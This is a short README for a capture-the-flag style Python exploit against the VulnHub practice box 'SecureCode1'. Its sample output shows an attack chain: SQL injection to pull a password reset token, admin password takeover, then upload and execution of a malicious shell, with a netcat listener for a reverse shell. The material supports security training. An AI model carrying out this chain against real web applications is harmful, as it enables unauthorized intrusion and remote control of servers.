# SecureCode1 Exploit

Python exploit for the VulnHub OSWE practice box 'SecureCode1'

## The Box

https://www.vulnhub.com/entry/securecode-1,651/

The box was fairly easy to exploit if you know your way around PHP code.

I have uploaded the exploit for anybody that needs a little nudge writing the final exploit.

## The Codez

[exploit.py](https://github.com/plackyhacker/SecureCode1/blob/main/exploit.py)

## Execution

```
python3 ./exploit.py 192.168.1.167 Password123
[+] Don't forget to start your netcat listener: nc -nvlp 4444
[+] Requesting password reset token...
[+] Using SQLi to get the password reset token...
[+] Found password reset token: QXAmvO3pCJlJDTa
[+] Changing the admin password to Password123
[+] Logging in to the web app...
[+] Checking access...
[+] Permitted, will continue...
[+] Uploading malicious shell...
[+] Executing malicious shell...
```
